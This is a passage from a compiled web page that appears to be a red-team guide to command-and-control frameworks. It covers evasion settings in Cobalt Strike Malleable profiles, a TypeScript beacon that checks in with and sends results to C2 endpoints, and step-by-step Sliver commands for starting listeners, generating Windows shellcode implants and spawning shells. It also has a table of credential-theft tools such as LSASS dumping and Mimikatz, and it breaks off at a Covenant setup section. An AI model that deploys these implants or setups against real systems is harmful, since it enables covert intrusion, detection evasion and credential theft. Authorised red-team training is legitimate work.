    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "22-malleable-c2-profiles--deep-dive",
      children: "2.2 Malleable C2 Profiles — Deep Dive"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A Malleable C2 profile defines every observable aspect of beacon-to-teamserver communication. Modern EDR and network detection fingerprint C2 by JA3/S, JARM, HTTP header ordering, URI patterns, and timing."
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "// malleable-parser.ts — Malleable C2 Profile Parser (Profile to JSON)\n\ninterface HttpProfile {\n  block: 'client' | 'server';\n  headers: HeaderDirective[];\n  parameters: ParameterDirective[];\n  uri: string;\n  verb?: 'GET' | 'POST' | 'HEAD';\n}\n\ninterface HeaderDirective { name: string; value: string; append: boolean; }\ninterface ParameterDirective { name: string; value: string; mask: boolean; }\n\ninterface HttpGetDirectives {\n  uri: string; verb: 'GET' | 'POST' | 'HEAD';\n  client: HttpProfileBlock; server: HttpProfileBlock;\n}\n\ninterface HttpProfileBlock {\n  headers: HeaderDirective[]; parameters: ParameterDirective[];\n  metadata?: HttpMetadataBlock; output?: HttpOutputBlock;\n}\n\ninterface HttpMetadataBlock {\n  base64: boolean; base64url: boolean; base64_raw: 'true' | 'false';\n  prepend: string; append: string; parameter: string; header: string;\n}\n\ninterface HttpOutputBlock {\n  base64: boolean; base64url: boolean; print: string;\n  prepend: string; append: string;\n}\n\ninterface MalleableProfile {\n  name: string; sleeptime: string; jitter: string; maxdns: string;\n  httpget: HttpGetDirectives; httppost: HttpGetDirectives;\n  httpStager: HttpStagerConfig; userAgent: string;\n  postex: PostExConfig; stage: StageConfig; processInject: ProcessInjectConfig;\n}\n\ninterface HttpStagerConfig { uri_x86: string; uri_x64: string; }\ninterface PostExConfig { obfuscate: boolean; smartInject: boolean; amsi_disable: number; }\n\ninterface StageConfig {\n  opaque: string; cleanup: boolean; sleep_mask: boolean; obfuscate: boolean;\n  stomppe: boolean; module_x64: string; module_x86: string; userwx: boolean;\n  entry_point: string; transform_x86: TransformDirective[];\n  transform_x64: TransformDirective[]; string_replace: StringReplace[];\n}\n\ninterface TransformDirective { type: 'strrep' | 'prepend' | 'append'; value?: string; }\ninterface StringReplace { original: string; replacement: string; }\ninterface ProcessInjectConfig { name: string; transform_x86: TransformDirective[]; transform_x64: TransformDirective[]; min_alloc: string; startrwx: boolean; userwx: boolean; }\n\nclass MalleableProfileParser {\n  parse(rawContent: string): MalleableProfile {\n    const lines = rawContent.split('\\n');\n    const profile: Partial<MalleableProfile> = {};\n    let currentBlock: string[] = [];\n    let blockName = '';\n\n    for (const line of lines) {\n      const t = line.trim();\n      if (t.startsWith('#') || t === '') continue;\n      if (t.includes('{') && !t.includes('}')) { blockName = t.replace(/\\s*\\{.*/, '').trim(); currentBlock = []; continue; }\n      if (t === '}') { this.processBlock(profile, blockName, currentBlock); currentBlock = []; blockName = ''; continue; }\n      if (blockName) { currentBlock.push(t); }\n      else { const [k, ...v] = t.split(/\\s+/); if (k && v.length > 0) (profile as any)[k] = v.join(' ').replace(/^\"(.*)\"$/, '$1'); }\n    }\n    return profile as MalleableProfile;\n  }\n\n  private processBlock(profile: Partial<MalleableProfile>, blockName: string, lines: string[]): void {\n    const key = blockName.toLowerCase().replace(/-/g, '_');\n    if (key === 'httpget' || key === 'httppost') (profile as any)[key] = this.parseHttpGetBlock(lines);\n    else if (key === 'http-stager') profile.httpStager = this.parseStagerBlock(lines);\n    else if (key === 'stage') profile.stage = this.parseStageBlock(lines);\n    else if (key === 'process-inject') profile.processInject = this.parseProcessInjectBlock(lines);\n    else if (key === 'post-ex') profile.postex = this.parsePostExBlock(lines);\n  }\n\n  private parseHttpGetBlock(lines: string[]): HttpGetDirectives {\n    const r: Partial<HttpGetDirectives> = {};\n    const cl: string[] = []; const sl: string[] = [];\n    let inC = false; let inS = false;\n    for (const line of lines) {\n      const t = line.trim();\n      if (t.startsWith('set')) { const m = t.match(/set\\s+(\\S+)\\s+\"([^\"]*)\"/); if (m) { if (m[1]==='uri') r.uri=m[2]; if (m[1]==='verb') r.verb=m[2] as any; } }\n      else if (t === 'client {') { inC = true; inS = false; }\n      else if (t === 'server {') { inS = true; inC = false; }\n      else if (t === '}') { inC = false; inS = false; }\n      else if (inC) cl.push(t);\n      else if (inS) sl.push(t);\n    }\n    r.client = this.parseProfileBlock(cl);\n    r.server = this.parseProfileBlock(sl);\n    return r as HttpGetDirectives;\n  }\n\n  private parseProfileBlock(lines: string[]): HttpProfileBlock {\n    const b: Partial<HttpProfileBlock> = { headers: [], parameters: [] };\n    for (const line of lines) {\n      const t = line.trim();\n      if (t.startsWith('header')) { const m = t.match(/header\\s+\"([^\"]*)\"\\s+\"([^\"]*)\"/); if (m) b.headers!.push({ name: m[1], value: m[2], append: false }); }\n      else if (t.startsWith('parameter')) { const m = t.match(/parameter\\s+\"([^\"]*)\"\\s+\"([^\"]*)\"/); if (m) b.parameters!.push({ name: m[1], value: m[2], mask: false }); }\n      else if (t.startsWith('metadata')) { b.metadata = { base64: t.includes('base64'), base64url: t.includes('base64url'), base64_raw: t.includes('base64-raw')?'true':'false', prepend: t.match(/prepend\\s+\"([^\"]*)\"/)?.[1]||'', append: t.match(/append\\s+\"([^\"]*)\"/)?.[1]||'', parameter: t.match(/parameter\\s+\"([^\"]*)\"/)?.[1]||'', header: t.match(/header\\s+\"([^\"]*)\"/)?.[1]||'' }; }\n      else if (t.startsWith('output')) { b.output = { base64: t.includes('base64'), base64url: t.includes('base64url'), print: t.match(/print\\s+\"([^\"]*)\"/)?.[1]||'', prepend: t.match(/prepend\\s+\"([^\"]*)\"/)?.[1]||'', append: t.match(/append\\s+\"([^\"]*)\"/)?.[1]||'' }; }\n    }\n    return b as HttpProfileBlock;\n  }\n\n  private parseStagerBlock(lines: string[]): HttpStagerConfig {\n    const s: Partial<HttpStagerConfig> = {};\n    for (const line of lines) { const m = line.match(/set\\s+(\\S+)\\s+\"([^\"]*)\"/); if (m) (s as any)[m[1].replace(/-/g,'_')] = m[2]; }\n    return s as HttpStagerConfig;\n  }\n\n  private parseStageBlock(lines: string[]): StageConfig {\n    const s: Partial<StageConfig> = { transform_x86: [], transform_x64: [], string_replace: [] };\n    for (const line of lines) {\n      const t = line.trim(); const m = t.match(/set\\s+(\\S+)\\s+\"([^\"]*)\"/);\n      if (m) { const bools = ['sleep_mask','obfuscate','cleanup','stomppe','userwx']; if (bools.includes(m[1])) (s as any)[m[1].replace(/-/g,'_')] = m[2]==='true'; else (s as any)[m[1].replace(/-/g,'_')] = m[2]; }\n      else if (t.startsWith('string')) { const sm = t.match(/string\\s+\"([^\"]*)\"\\s+\"([^\"]*)\"/); if (sm) s.string_replace!.push({ original: sm[1], replacement: sm[2] }); }\n    }\n    return s as StageConfig;\n  }\n\n  private parseProcessInjectBlock(lines: string[]): ProcessInjectConfig {\n    const i: Partial<ProcessInjectConfig> = {};\n    for (const line of lines) { const m = line.match(/set\\s+(\\S+)\\s+\"([^\"]*)\"/); if (m) (i as any)[m[1]] = m[2]; }\n    return i as ProcessInjectConfig;\n  }\n\n  private parsePostExBlock(lines: string[]): PostExConfig {\n    const p: Partial<PostExConfig> = {};\n    for (const line of lines) { const m = line.match(/set\\s+(\\S+)\\s+\"([^\"]*)\"/); if (m) { if (m[1]==='obfuscate'||m[1]==='smart_inject') (p as any)[m[1]]=m[2]==='true'; else if (m[1]==='amsi_disable') p.amsi_disable=parseInt(m[2]); } }\n    return p as PostExConfig;\n  }\n\n  toJSON(profile: MalleableProfile): string { return JSON.stringify(profile, null, 2); }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Malleable Profile Key Parameters:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Directive"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Example Value"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "sleeptime"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Milliseconds between beacon check-ins"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "60000 (60s)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "jitter"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Random delay percentage added to sleep"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "20 (20% jitter)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "maxdns"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Maximum DNS label length"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "255"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "http-get.uri"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "URI path for GET requests"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "/gp/css/signin/select.html"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "stage.obfuscate"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Obfuscate the reflective DLL loader"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "true"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "stage.sleep_mask"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Encrypt beacon in memory during sleep"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "true"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "stage.stomppe"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Overwrite mapped PE with section contents"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "true"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "post-ex.amsi_disable"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Number of AMSI bypasses to apply"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "1"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "process-inject.startrwx"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Start with RWX permissions (bad OPSEC)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "false"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "23-beacon-types--staged-vs-stageless",
      children: "2.3 Beacon Types — Staged vs Stageless"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Property"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Staged"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Stageless"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Delivery"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Small stager (~4KB) fetches full beacon"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Full beacon in one payload"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Network"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Two connections: stager + callback"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "One connection: callback"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stager download fingerprinted easily"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Harder to detect"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Size"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Stager tiny (fits in macro)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Larger (200KB-500KB)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Use Case"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Phishing macros, limited space"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Direct deployment, reliability"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "24-c2-communication-flow-diagram",
      children: "2.4 C2 Communication Flow Diagram"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-mermaid",
        children: "sequenceDiagram\n    participant Operator as Red Team Operator\n    participant TeamSvr as Team Server\n    participant Beacon as Victim Beacon\n    participant Target as Target Network\n    Operator->>TeamSvr: Connect (TCP 50050)\n    TeamSvr->>Beacon: Deploy stager (HTTP/HTTPS/DNS)\n    Note over Beacon: Stager executes, downloads full beacon\n    loop Beacon Interval (60s +- 20% jitter)\n        Beacon->>TeamSvr: HTTP GET metadata (base64 Cookie)\n        TeamSvr-->>Beacon: 200 OK (tasks in response)\n        Note over Beacon: Execute tasks (shell, inject)\n        Beacon->>TeamSvr: HTTP POST output (base64 body)\n        TeamSvr-->>Beacon: 200 OK (next sleep)\n    end\n    Beacon->>Target: Lateral movement (WMI/SMB/WinRM)\n    Target-->>Beacon: Access granted\n    Beacon->>TeamSvr: Exfiltrated data (encrypted)\n    TeamSvr-->>Operator: Results in console\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "25-c2-beacon-simulator-typescript",
      children: "2.5 C2 Beacon Simulator (TypeScript)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "// c2-beacon-simulator.ts — Beacon with Jitter, Sleep, Tasking\n\ninterface BeaconConfig {\n  callbackInterval: number; jitterPercent: number; maxRetries: number;\n  c2Endpoints: string[]; userAgent: string; killDate: Date;\n}\n\ninterface BeaconTask {\n  id: string; command: string; args: string[];\n  status: 'pending' | 'running' | 'completed' | 'failed'; output: string;\n}\n\ntype BeaconState = 'sleeping' | 'connecting' | 'tasking' | 'executing' | 'error' | 'dead';\n\nclass C2Beacon {\n  private config: BeaconConfig;\n  private state: BeaconState = 'sleeping';\n  private checkinCount = 0;\n  private failedConnections = 0;\n  private pendingTasks: BeaconTask[] = [];\n  private completedTasks: BeaconTask[] = [];\n  private agentId: string;\n  private metadata: Record<string, string>;\n\n  constructor(config: BeaconConfig) {\n    this.config = config;\n    this.agentId = this.generateId();\n    this.metadata = { computerName: 'WS-01', userName: 'user', domain: 'domain.local', osVersion: '10.0.19041', processName: 'explorer.exe' };\n  }\n\n  start(): void {\n    console.log('[BEACON] Starting interval ' + this.config.callbackInterval + 'ms, ' + this.config.jitterPercent + '% jitter');\n    if (new Date() >= this.config.killDate) { this.state = 'dead'; return; }\n    this.scheduleNext();\n  }\n\n  stop(): void { this.state = 'dead'; }\n\n  queueTask(command: string, args: string[] = []): string {\n    const task: BeaconTask = { id: 'T-' + Date.now(), command, args, status: 'pending', output: '' };\n    this.pendingTasks.push(task);\n    return task.id;\n  }\n\n  private scheduleNext(): void {\n    const j = this.config.jitterPercent / 100;\n    const delay = Math.max(this.config.callbackInterval * (1 + (Math.random() * 2 - 1) * j), 1000);\n    this.state = 'sleeping';\n    setTimeout(() => this.checkin(), delay);\n  }\n\n  private async checkin(): Promise<void> {\n    this.state = 'connecting';\n    this.checkinCount++;\n    try {\n      const response = await this.sendCallback();\n      this.failedConnections = 0;\n      if (response.tasks) for (const t of response.tasks) this.pendingTasks.push(t);\n      await this.executeTasks();\n      await this.sendResults();\n      this.scheduleNext();\n    } catch (err) {\n      this.failedConnections++;\n      if (this.failedConnections >= this.config.maxRetries) { this.state = 'dead'; }\n      else { setTimeout(() => this.checkin(), Math.min(60000, 5000 * Math.pow(2, this.failedConnections))); }\n    }\n  }\n\n  private async sendCallback(): Promise<any> {\n    for (const ep of this.config.c2Endpoints) {\n      try {\n        const res = await fetch(ep, { method: 'POST', headers: { 'User-Agent': this.config.userAgent }, body: Buffer.from(JSON.stringify({ id: this.agentId })).toString('base64') });\n        if (res.ok) return JSON.parse(Buffer.from(await res.text(), 'base64').toString());\n      } catch { continue; }\n    }\n    throw new Error('C2 endpoints failed');\n  }\n\n  private async executeTasks(): Promise<void> {\n    while (this.pendingTasks.length > 0) {\n      const task = this.pendingTasks.shift()!;\n      task.status = 'running';\n      task.output = await this.runCommand(task.command, task.args);\n      task.status = 'completed';\n      this.completedTasks.push(task);\n    }\n  }\n\n  private async runCommand(cmd: string, args: string[]): Promise<string> {\n    if (cmd === 'whoami') return this.metadata.domain + '\\\\' + this.metadata.userName;\n    if (cmd === 'ipconfig') return 'IPv4: 10.0.0.' + Math.floor(Math.random() * 254);\n    if (cmd === 'sleep' && args[0]) { this.config.callbackInterval = parseInt(args[0]); return 'Sleep set to ' + args[0] + 'ms'; }\n    return '[' + cmd + '] completed.';\n  }\n\n  private async sendResults(): Promise<void> {\n    if (this.completedTasks.length === 0) return;\n    const payload = Buffer.from(JSON.stringify({ id: this.agentId, results: this.completedTasks })).toString('base64');\n    for (const ep of this.config.c2Endpoints) {\n      try { await fetch(ep + '/results', { method: 'POST', body: payload }); break; } catch { continue; }\n    }\n    this.completedTasks = [];\n  }\n\n  getStatus() { return { agentId: this.agentId, state: this.state, checkins: this.checkinCount }; }\n  private generateId(): string { return Array.from({length:32},()=>'0123456789abcdef'[Math.floor(Math.random()*16)]).join(''); }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "3-c2-frameworks--sliver",
      children: "3. C2 Frameworks — Sliver"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "31-sliver-architecture",
      children: "3.1 Sliver Architecture"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Sliver is an open-source, Go-based C2 framework developed by BishopFox. It supports mTLS, HTTP(S), DNS, and WireGuard-based C2 channels. Sliver uses a server-client model where operators connect to the Sliver server via the Sliver client or gRPC API."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Key Differentiators from Cobalt Strike:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Completely free and open-source (BSD-3)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Written in Go (cross-platform implants)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Native mTLS with mutual authentication"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Built-in armory for community-shared profiles/aliases"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Stage listeners for staged payloads"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Operator/player role-based access control"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Full gRPC API for automation"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "32-sliver-c2-setup-guide--full-deployment",
      children: "3.2 Sliver C2 Setup Guide — Full Deployment"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
        children: "# STEP 1: Download and Install Sliver Server (Ubuntu 22.04)\ncurl -sL https://sliver.sh/install | sudo bash\nwget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux\nsudo mv sliver-server_linux /usr/local/bin/sliver-server\nsudo chmod +x /usr/local/bin/sliver-server\n\n# STEP 2: Start the Sliver Server\nsliver-server\n\n# STEP 3: Create Operators\nnew-operator --name red-team-lead --lhost your-server-ip --save ./configs/\nnew-operator --name operator-1 --lhost your-server-ip --save ./configs/\n\n# STEP 4: Start Listeners\nmtls --lhost 0.0.0.0 --lport 443\nhttp --lhost 0.0.0.0 --lport 80 --domain acme-redteam.com\nhttps --lhost 0.0.0.0 --lport 443 --domain cdn.acme-redteam.com\ndns --lhost 0.0.0.0 --lport 53 --domains dns1.acme-redteam.com\n\n# STEP 5: Generate Implants\ngenerate --mtls your-server-ip --os windows --arch amd64 --name acme-beacon --save ./payloads/\ngenerate --https cdn.acme-redteam.com --os windows --arch amd64 --name stealth --save ./payloads/ --max-errors 10 --days 30 --format shellcode\n\n# STEP 6: Interact with Beacons\nimplants      # List all active beacons\nuse <id>      # Select beacon\ninfo          # Show details\nshell         # Spawn interactive shell\nsideload /path/to/bof.o   # Execute BOF\nexecute-assembly /path/to/SharpHound.exe\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "33-sliver-operator-configuration-typescript",
      children: "3.3 Sliver Operator Configuration (TypeScript)"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-typescript",
        children: "// sliver-operator.ts — Sliver Operator Configuration and Management\n\ninterface SliverConfig { serverHost: string; serverPort: number; tlsConfig: TLSConfig; }\ninterface TLSConfig { caCert: string; cert: string; key: string; mutualTLS: boolean; }\ninterface SliverOperator { name: string; config: SliverConfig; token: string; permissions: OperatorPermissions; }\ninterface OperatorPermissions { canGenerate: boolean; canEquipArmory: boolean; maxImplants: number; allowedProtocols: string[]; allowedTargets: string[]; }\ninterface SliverImplant { id: string; name: string; os: string; arch: string; transport: string; endpoint: string; beaconInterval: number; jitter: number; active: boolean; }\ninterface ArmoryPackage { name: string; version: string; type: string; description: string; commands: string[]; source: string; }\n\nclass SliverManager {\n  private operators: Map<string, SliverOperator> = new Map();\n  private implants: Map<string, SliverImplant> = new Map();\n  private armory: Map<string, ArmoryPackage> = new Map();\n  private config: SliverConfig;\n\n  constructor(config: SliverConfig) { this.config = config; }\n\n  createOperator(name: string, perms: Partial<OperatorPermissions>): SliverOperator {\n    const op: SliverOperator = {\n      name, config: this.config, token: this.generateToken(),\n      permissions: { canGenerate: perms.canGenerate ?? true, canEquipArmory: perms.canEquipArmory ?? true, maxImplants: perms.maxImplants ?? 50, allowedProtocols: perms.allowedProtocols ?? ['mtls','https'], allowedTargets: perms.allowedTargets ?? ['*'] },\n    };\n    this.operators.set(name, op); return op;\n  }\n\n  startListener(protocol: string, port: number, domain?: string): void {\n    console.log('[SLIVER] ' + protocol.toUpperCase() + ' listener on :' + port + (domain ? ' for ' + domain : ''));\n  }\n\n  generateImplant(cfg: { name: string; transport: string; endpoint: string; os: string; arch: string; beaconInterval?: number; jitter?: number; }): SliverImplant {\n    const imp: SliverImplant = { id: 'IMP-' + Date.now().toString(36), name: cfg.name, os: cfg.os, arch: cfg.arch, transport: cfg.transport, endpoint: cfg.endpoint, beaconInterval: cfg.beaconInterval || 30, jitter: cfg.jitter || 15, active: true };\n    this.implants.set(imp.id, imp); return imp;\n  }\n\n  executeTask(implantId: string, command: string, args: string[]): string {\n    const imp = this.implants.get(implantId);\n    if (!imp || !imp.active) throw new Error('Implant not found');\n    return '[' + imp.name + '] ' + command + ' ' + args.join(' ');\n  }\n\n  installArmory(pkg: ArmoryPackage): void { this.armory.set(pkg.name, pkg); console.log('[SLIVER] Armory ' + pkg.name + ' installed'); }\n  private generateToken(): string { const c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-'; return Array.from({length:64},()=>c[Math.floor(Math.random()*c.length)]).join(''); }\n  snapshot(): string { return JSON.stringify({ operators: this.operators.size, implants: Array.from(this.implants.values()).filter(i=>i.active).length, armory: this.armory.size }); }\n}\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "34-sliver-armory--popular-packages",
      children: "3.4 Sliver Armory — Popular Packages"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Package"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Type"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Description"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SharpHound"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Assembly"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "BloodHound AD ingestor for AD topology data"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Rubeus"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Assembly"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Kerberos abuse: kerberoast, asreproast, asktgt, s4u"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Seatbelt"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Assembly"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Host security enumeration"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SharpUp"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Assembly"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Privilege escalation checks for Windows"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Nanodump"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "BOF"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "LSASS minidump without touching disk"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "MimiKatz"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extension"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Legacy credential extraction"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "4-c2-frameworks--covenant",
      children: "4. C2 Frameworks — Covenant"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "41-covenant-architecture",
      children: "4.1 Covenant Architecture"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Covenant is a .NET-based C2 framework focusing on ASP.NET Core, gRPC-based staging, and dynamic C# compilation. Tasks compile as C# at runtime on the server and execute on the grunt (implant)."
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Key Concepts:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Grunt: The Covenant implant (C#, .NET assembly)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Bridge: Grunt-to-listener protocol (HTTP/HTTPS with gRPC)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Stage1->Stage2: Staged payload delivery"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Dynamic Compilation: Tasks compile at runtime on server"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Launcher: Bootstrap methods (binary, PowerShell, MSBuild, VBA)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "42-covenant-setup-guide",
      children: "4.2 Covenant Setup Guide"
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        className: "language-bash",
